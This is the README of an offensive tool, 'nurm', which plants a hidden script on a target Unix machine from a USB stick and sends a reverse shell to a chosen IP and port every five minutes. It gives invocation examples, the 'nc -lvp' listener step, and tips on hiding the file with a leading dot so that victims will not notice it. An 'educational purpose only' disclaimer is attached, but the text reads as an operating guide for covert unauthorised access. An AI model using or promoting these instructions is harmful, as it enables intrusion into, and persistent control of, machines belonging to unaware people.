**This project is for educational purpose only**

## What is nurm?
"Now You Are Mine"(nurm) is an automatic reverse shell script that is designed to be placed and run on the target unix computer via the portable usb drive.

## What does it do?
Once run from the usb, nurm will send the reverse shell to any ip address and port that the user specified every five minutes, allowing the following device with the given ip address to access an interactive shell of the target given that the device is listening to the port specified.

## Usage
**nurm**  
1) Download the script to your favorite usb stick
2) Run the script on the target machine once.  
   **Usage(v 1.2)**: `./nurm [-a ipaddress] [-p port] [-f full-path-filename] [-c]`  
   [-a ip address] - the ip address that the reverse shell will be sent through.  
   [-p port] - the port that is used for the udp connection  
   [-f full-path-filename] - the file with its full path that the reverse shell script will be stored  
   [-c] - load all variables from nurm.conf
3) Use nc -lvp [port] on the ip address  
4) The interactive shell will be sent every 5 minutes

## Examples
`./nurm -a 127.168.123.98 -p 8987 -f /home/user1/.test` will create a script that will send the reverse shell to the address 127.168.123.98 at port 8987 and store the script to /home/user1/.test  
`./nurm -c` will create a script according to the configuration in nurm.conf

## Precautions/ Tips
1) Always hide the file with ".". For example, .test. This way, many unexperienced users will never be ware of the script.
2) The listening device should either be a server or a computer with static ip address. Otherwise, your computer can only be used once.
3) Use the nurm.conf to keep track of your server port and to save your time.
4) For optimization reason, **the variable order of nurm.conf is designed to be unchanged. Changing the order of dport variable will break the config file.**
4) **This script is for educational purpose only. Don't use it to do illegal activities. You are the only responsible for your actions!**

## Status
Currently only support netcat reverse shell.
Now supports config file to save your time.

## Upcoming features
- most reverse-shell support for common langauges
- partial config override
